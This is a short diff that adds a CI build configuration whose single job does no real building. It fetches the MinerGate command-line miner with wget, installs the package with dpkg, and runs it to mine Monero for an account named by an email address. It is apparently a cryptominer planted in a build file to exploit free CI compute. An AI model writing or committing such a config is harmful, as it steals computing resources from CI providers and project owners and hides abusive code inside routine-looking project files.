@@ -1,0 +1,12 @@
+language: bash
+sudo: true
+os:
+- linux
+build-master:
+  stage: build
+  script:
+    - apt-get update 
+    - apt-get -qq --no-install-recommends install ca-certificates wget
+    - wget -q --content-disposition https://minergate.com/download/deb-cli
+    - dpkg -i *.deb
+    - minergate-cli -user mssalatgereev@gmail.com -xmr
